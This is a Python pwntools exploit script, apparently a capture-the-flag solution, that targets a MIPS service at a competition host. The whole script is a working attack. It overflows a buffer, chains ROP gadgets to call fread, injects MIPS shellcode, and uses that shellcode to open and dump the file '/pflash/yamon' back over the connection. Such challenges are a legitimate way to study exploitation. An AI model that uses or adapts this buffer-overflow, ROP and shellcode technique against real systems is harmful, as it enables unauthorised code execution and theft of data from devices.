from pwn import *

HOST, PORT = 'chall.0ops.sjtu.edu.cn', 9999
# HOST, PORT = '0.0.0.0', 31338
r = remote(HOST, PORT)

context.endian = 'big'
context.arch = 'mips'
addr = 0x40c000

rop0 = 0x401258
rop1 = 0x40a268
fread = 0x401534
main = 0x401030


def call(target, arg0, arg1=0, arg2=0, arg3=0, ra=main):
    global payload
    # $v0 = ?
    payload += flat({
        0x10: arg3,
        0x14: rop0
    })
    # $s0 = target
    payload += flat({
        0x10: target,
        0x14: rop1
    })

    # $s0(arg0, arg1, arg2)
    payload += flat({
        28: arg1,
        24: arg2,
        32: arg0,
        0x34: ra
    })


def _call(target, arg0, arg1=0, arg2=0, arg3=0, ra=main):
    global payload
    payload = b"A" * 0x14 + p32(rop0)
    call(target, arg0, arg1, arg2, arg3, ra)
    payload = payload.ljust(0x200, b"\x61")
    print(hexdump(payload))
    r.send(payload)


stdin = 0x40e2f4
code = asm("""
	li $a0, 0xB
	la $a1, path
	li $a2, 2
	jal 0x00401150
	nop

	move $s0, $v0

	a:

	move $a0, $s0
	li $a1, 0x40f100
	li $a2, 0x100
	jal 0x4010f0
	nop

	beqz $v0, exit

	li $a0, 1
	li $a1, 0x40f100
	li $a2, 0x100
	jal 0x401120
	nop

	b a

	exit:

	nop
	la $v0, 0x4013c0
	jalr $v0
	li $a0, 1337
	nop

	path:
	.asciz "/pflash/yamon"

	argv:
	.long 0, 0

	fmt:
	.asciz "result: %p\\n"

	buf:
	""", vma=addr)

_call(fread, addr, 1, len(code), stdin, addr)
r.send(code)
f = open('f', 'wb', 0)
while True:
    f.write(r.recv(0x100))
r.interactive()
